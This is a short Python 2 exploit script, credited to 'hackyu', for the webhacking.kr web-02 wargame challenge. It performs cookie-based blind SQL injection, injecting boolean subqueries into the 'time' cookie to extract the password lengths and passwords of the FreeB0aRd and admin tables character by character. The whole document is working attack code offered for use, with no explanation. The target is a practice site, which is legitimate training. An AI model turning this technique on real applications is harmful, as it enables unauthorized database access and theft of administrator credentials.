#Code Written by hackyu
import requests

FreeB0aRd_pw_length = 0
board_pw = ""
admin_pw_length = 0
admin_pw = ""

url = "http://webhacking.kr/challenge/web/web-02/index.php"

#Find Board PW Length
for i in range(1,20):
    headers = {
	    "Cookie": "time=1534861794 and (select length(password) from FreeB0aRd) = %d; PHPSESSID=Your PHPSESSID" % i
    }
    try:
        print "Try: %d" % i 
        res = requests.get(url, headers=headers)
    
        if "<!--2070-01-01 09:00:01-->" in res.content:
            print "Find!!!!!!!!!!!\n"
            FreeB0aRd_pw_length = i
            break
    except Exception as e:
        i = i-1
        continue

print "Board Password Length:", FreeB0aRd_pw_length



#Find Board PW
for i in range(1,FreeB0aRd_pw_length+1):
    for j in range(0x21,0x7f):
        
        headers = {
	        "Cookie": "time=1534861794 and ascii((select substr(password,%d,1) from FreeB0aRd)) = %d; PHPSESSID=Your PHPSESSID" % (i,j)
        }

        try:
            print "Try: %d" % j
            print "Try: %c" % chr(j) 
            res = requests.get(url, headers=headers)

            if "<!--2070-01-01 09:00:01-->" in res.content:
                print "Find!!!!!!!!!!!\n"
                board_pw = board_pw+chr(j)
                print board_pw
                break

        except Exception as e:
            j = j-1
            continue

print "Board PW", board_pw



#Find ADMIN PW Length
for i in range(1,20):
    headers = {
	    "Cookie": "time=1534861794 and (select length(password) from admin) = %d; PHPSESSID=Your PHPSESSID" % i
    }
    try:
        print "Try: %d" % i 
        res = requests.get(url, headers=headers)
        
        if "<!--2070-01-01 09:00:01-->" in res.content:
            print "Find!!!!!!!!!!!\n"
            admin_pw_length = i
            break
    except Exception as e:
        i = i-1

print "ADMIN Password Length:", admin_pw_length



#Find ADMIN PW 
for i in range(1,admin_pw_length+1):
    for j in range(0x21,0x7f):
        
        headers = {
	        "Cookie": "time=1534861794 and ascii((select substr(password,%d,1) from admin)) = %d; PHPSESSID=Your PHPSESSID" % (i,j)
        }

        try:
            print "Try: %d" % j
            print "Try: %c" % chr(j) 
            res = requests.get(url, headers=headers)

            if "<!--2070-01-01 09:00:01-->" in res.content:
                print "Find!!!!!!!!!!!\n"
                admin_pw = admin_pw+chr(j)
                print admin_pw
                break
        
        except Exception as e:
            j = j-1        

print "board_pw_length", FreeB0aRd_pw_length
print "board_pw", board_pw
print "admin_pw_length", admin_pw_length
print "admin_pw", admin_pw   